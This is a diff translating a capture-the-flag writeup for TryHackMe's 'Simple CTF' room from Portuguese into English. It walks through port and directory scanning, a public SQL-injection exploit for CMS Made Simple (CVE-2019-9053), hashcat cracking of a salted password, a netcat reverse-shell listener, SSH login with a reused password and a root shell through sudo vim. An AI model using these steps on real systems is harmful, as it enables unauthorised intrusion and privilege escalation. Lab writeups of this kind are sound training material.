@@ -1,37 +1,34 @@
-> [!WARNING]
-> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).
-
 # [Simple CTF](https://tryhackme.com/room/easyctf)
 
-<a href="https://tryhackme.com/room/easyctf"><figure><img src="./assets/logo.png" width="300" title="tryhackme.com - © TryHackMe"></figure></a>
+<a href="https://tryhackme.com/room/easyctf"><figure><img src="./assets/logo.png" width="175" title="tryhackme.com - © TryHackMe"></figure></a>
 
 > Beginner level ctf
 
-Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/easyctf), feito por [MrSeth6797](https://tryhackme.com/p/MrSeth6797).
+Original Capture The Flag available on [host](https://tryhackme.com/room/easyctf), made by [MrSeth6797](https://tryhackme.com/p/MrSeth6797).
 
-Dificuldade: `Fácil`
+Dificulty: `Easy`
 
-Resolvido em: `2026/04/28`
+Solved in: `2026/04/28`
 
-# Conteúdos
+# Table of Contents
 
 - [Simple CTF](#simple-ctf)
-- [Conteúdos](#conteúdos)
+- [Table of Contents](#table-of-contents)
 - [Writeup](#writeup)
-   * [Sumário](#sumário)
-   * [Reconhecimento](#reconhecimento)
-   * [Exploração](#exploração)
-   * [Escalação de Privilégios](#escalação-de-privilégios)
+   * [Summary](#summary)
+   * [Reconnaissance](#reconnaissance)
+   * [Exploration](#exploration)
+   * [Privilege Escalation](#privilege-escalation)
 
 # Writeup
 
-## Sumário
+## Summary
 
-Usando um SQL injection é possível descobrir a senha de acesso do servidor que, por negligência, também é da máquina.
+Using SQL injection it's possible to discover the password to a server that, by negligence, is also the machine's password.
 
-## Reconhecimento
+## Reconnaissance
 
-Como de usual, a primeira coisa a se fazer é colocar o IP da máquina como um host em `/etc/hosts` para fácil acesso. Escolhi `ectf.net`, e testando para verificar se tudo está funcionando:
+As usual, the first thing to do is save the machine's IP as a host in `/etc/hosts` for easy access. I chose `ectf.net`, and as such:
 
 ```bash
 $ ping -c 3 ectf.net     
@@ -45,7 +42,7 @@ PING ectf.net (<MACHINE_IP>) 56(84) bytes of data.
 rtt min/avg/max/mdev = 162.716/185.450/207.903/18.448 ms
 ```
 
-Com isso, parte-se à próxima etapa: a busca por portas. Realizando uma busca simples com `nmap`:[^nmap]
+With that done, I searched for ports using `nmap`:[^nmap]
 
 ```bash
 $ nmap -p- -sV -sC -T4 -o nmap_scan ectf.net
@@ -86,21 +83,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 171.88 seconds
 ```
 
-Com isso, já é possível resolver duas questões:
+That way two questions can already be answered:
 - Q: How many services are running under port `1000`? A: `2`
 - Q: What is running on the higher port? A: `ssh`
 
-E então realmente começa o reconhecimento. Como primeiro ponto de entrada, chequei o que estava no html...
+And now really starts the "recon-ning". Searching for an entrance point I chose html...
 
 <figure><img src="./assets/ectf_0.png" title="/index.html"></figure>
 
-É uma página padrão do Apache2. Bem, já que está assim, não há muito o que se fazer senão usar o `gobuster`[^gobuster] para encontrar mais diretórios. Eu usei ele junto de uma das listas padrões do kali linux:[^wl-dir23med]
+It's the default landing page for an Apache2 server. So, if so, there's not much to be done but use `gobuster`[^gobuster] to find more directories. Using it along one of the default wordlists:[^wl-dir23med]
 
 ```bash
 $ gobuster dir -u ectf.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
 ```
 
-Eu não acho que terão muitos resultados. Enquanto o `gobuster` roda, decidi explorar o `ftp` como `anonymous` para verificar o que estava disponível:
+I don't there will be many results. As `gobuster` goes on, I decided to explore `ftp` as `anonymous` to see what was available:
 
 ```bash
 $ ftp ectf.net 21
@@ -132,15 +129,15 @@ ftp> bye
 221 Goodbye.
 ```
 
-Muito bem, tinha apenas um arquivo, `ForMitch.txt`:
+Well, there was only one archive, `ForMitch.txt`:
 
 ```
 Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
 ```
 
-Realmente, Mitch, nunca use a mesma senha para duas coisas. De acordo com esse outro (eu assumo) hacker, então a senha que eu encontrar deve ser a mesma para o usuário. Deve ser o `ssh`, e meu chute já é que o usuário é "mitch".
+Exactly, Mitch, you should never use the same passwords. According to this (I assume) other hacker, the pass I eventually find is the same for the user, whatever that means. My guess is that they mean the `ssh`, and the user must be "mitch".
 
-Dito isso, voltando ao `gobuster`, apenas um novo diretório apareceu:
+That said, back to `gobuster`:
 
 ```bash
 $ gobuster dir -u ectf.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -153,15 +150,15 @@ Starting gobuster in directory enumeration mode
 /simple               (Status: 301) [Size: 305] [--> http://ectf.net/simple/
 ```
 
-Enquanto `robots.txt` parece ser o arquivo padrão para o Apache2, o diretório `/simple` é muito mais interessante:
+While `robots.txt` seems to be the default Apache2 file, the directory `/simple` is far more interesting:
 
 <figure><img src="./assets/ectf_1.png" title="/simple"></figure>
 
-É a página padrão para o *CMS Made Simple*. Bem, não tem muito aqui... Temos apenas uma notícia deixada por nosso amigo "mitch":
+It's the default landing page for *CMS Made Simple*. Not much here... There's only some news left by our friend "mitch":
 
 <figure><img src="./assets/ectf_2.png" title="News by mitch"></figure>
 
-Mais uma vez este "mitch" aparece. Seguindo rumo, fazendo outra pesquisa com `gobuster` apenas agora no `ectf.net/simple` obtive: 
+Once more we see "mitch". Following suit, another search with `gobuster` on the `etcf.net/simple` path reveals:
 
 ```bash
 $ gobuster dir -u ectf.net/simple -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -181,15 +178,15 @@ Starting gobuster in directory enumeration mode
 /tmp                  (Status: 301) [Size: 309] [--> http://ectf.net/simple/tmp/]
 ```
 
-Bem, a maior parte destes não ajuda muito, mas `/admin` aparenta ser o painel de admin:
+Most of these are of not much use, though `/admin` must be the admin panel:
 
 <figure><img src="./assets/ectf_3.png" title="/simple/admin"></figure>
 
-Apesar de ter o usuário, sem nenhuma indicação de senha (e te garanto que URI fuzzing não funcionou) decidi procurar por informações em outro lugar.
+Though I have the user, without any password info (and I guarantee you URI fuzzing didn't work) I decided to instead search for info in other places.
 
-## Exploração
+## Exploration
 
-Sem muitas outras opções, recorri ao `searchsploit`[^srchspl] para verificar se existia algum *exploit* disponível para CMS Made Simple. Filtrando apenas aqueles que estão disponíveis para a versão deste site (`2.2.8`), encontrei:
+Without many options, I recurred to `searchsploit`[^srchspl] to verify if there was some available *exploit* for CMS Made Simple. Filtering for those only available to this site's version of it (`2.2.8`), I found:
 
 ```bash
 $ searchsploit CMS Made Simple
@@ -204,11 +201,12 @@ CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload  
 Shellcodes: No Results
 ```
 
-Temos um [SQL Injection](https://www.exploit-db.com/exploits/46635)! Com isso, outras duas perguntas são respondidas:
+
+We have a [SQL Injection](https://www.exploit-db.com/exploits/46635)! Two more questions can be answered, as so:
 - Q: What's the CVE you're using against the application? A: `CVE-2019-9053`
 - Q: To what kind of vulnerability is the application vulnerable? A: `sqli`
 
-Ajustando o código python[^py] do exploit (estava em python2, tive de fazer o upgrade para python3), basta executar o código:
+Adjusting the python[^py] of the exploit (it was in python2, I had to upgrade it to python3), all to do is execute it:
 
 ```bash
 $ python3 ~/Desktop/46635.py -u http://ectf.net/simple/ --crack -w ~/Desktop/rockyou.txt
@@ -219,9 +217,9 @@ $ python3 ~/Desktop/46635.py -u http://ectf.net/simple/ --crack -w ~/Desktop/roc
 [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
 ```
 
-Devo notar que precisei executar esse código diversas vezes para que as informações establizassem. Havia alguma entropia atrapalhando os resultados.
+I should note I needed to execute this code several times so the information stabilized. There was some entropy messing with the results.
 
-Com isso, obtive um hash: `0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6b9`. Uma verificação rápida com `hashid`[^hashid] revela que é MD5:
+From it came a hash: `0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6b9`. A quick `hashid`[^hashid] reveals it is a MD5:
 
 ```bash
 $ hashid 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
@@ -232,7 +230,7 @@ Analyzing '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2'
 ...
 ```
 
-Tentei progressivamente quebrar com `hashcat`[^hashcat] (e a wordlist `rockyou`[^rockyou]) as diversas versões do MD5 que continham um *salt* até finalmente obter uma resposta com `md5($salt.$pass)`:
+I tried progressively to crack it with `hashcat`[^hashcat] (e a wordlist `rockyou`[^rockyou]) the several MD5 algorithms that had a *salt* in it until finally getting an password with `md5($salt.$pass)`:
 
 ```bash
 $ hashcat -a 0 -m 20 "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" /usr/share/wordlists/rockyou.txt.gz
@@ -248,18 +246,18 @@ Started: Tue Apr 28 23:47:07 2026
 Stopped: Tue Apr 28 23:47:18 2026
 ```
 
-Ótimo! Mais uma pergunta respondida.
+Great! One more question solved.
 - Q: What's the password? A: <FLAG0>
 
-Com essa senha consegui acesso ao painel de admin!
+This password gives access to the admin panel!
 
 <figure><img src="./assets/ectf_4.png" title="CMS Made Simple admin panel"></figure>
 
-E eventualmente a uma área de upload de arquivos:
+And eventually to an upload area:
 
 <figure><img src="./assets/ectf_5.png" title="Panel File Manager"></figure>
 
-Cheguei até a montar um revshell[^rv] aqui, mas uma vez que o usuário designado é `www-data`:
+I did try making a revshell[^rv] here, but since the user is `www-data`:
 
 ```bash
 $ nc -lvnp 9001
@@ -275,7 +273,7 @@ $ whoami
 www-data
 ```
 
-Os privilégios estavam muito bem configurados e não consegui acesso às pastas de usuário. Descobri, porém, que existia outro usuário na máquina.
+The privileges of it were too well-configured to do much. Though, I discovered that there was another user on the machine:
 
 ```bash
 $ pwd
@@ -287,7 +285,7 @@ mitch
 
 - Q: Is there any other user in the home directory? What's its name? A: <FLAG1>
 
-Dito isso, tive de relembrar a mensagem anterior deixada por outro hacker... ou, eu suponho, por <FLAG1>. Nela dizia que mitch usou a mesma senha para o usuário.
+That said, I had to remember the earlier note left by other hacker... or, I suppose, by <FLAG1>. In it it said that mitch used the same password for the user.
 
 ```bash
 $ nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 2222 ectf.net
@@ -305,7 +303,7 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
 ```
 
-O ssh aceita senha! Então decidi tentar fazer o login.
+The ssh accepts password! So, I tried loging in.
 - Q: Where can you login with the details obtained? A: ssh
 
 ```bash
@@ -326,9 +324,9 @@ $ whoami
 mitch
 ```
 
-## Escalação de Privilégios
+## Privilege Escalation
 
-Finalmente entrei na máquina! Com isso, é rápido encontrar a bandeira de usuário:
+There we go, I'm in! With that it is quite easy to find the user flag:
 
 ```bash
 $ pwd
@@ -337,7 +335,7 @@ $ cat user.txt
 <FLAG_USER>
 ```
 
-E, dando uma bisbilhotada nos resultados de `sudo -l`:
+And peeking at `sudo -l`:
 
 ```bash
 $ sudo -l
@@ -345,10 +343,10 @@ User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
 
-Temos o `vim` como `NOPASSWD`. 
+I find `vim` as `NOPASSWD`. 
 - Q: What can you leverage to spawn a privileged shell? A: vim
 
-Basta então mandar o vim executar um shell:
+Just tell vim to execute a shell,
 
 ```bash
 sudo vim -c ':!/bin/sh'
@@ -362,7 +360,7 @@ root
 <FLAG_ROOT>
 ```
 
-Que assim obtive a bandeira de root.
+That the root flag soon comes.
 
 [^nmap]: https://github.com/nmap/nmap
 [^gobuster]: https://github.com/OJ/gobuster
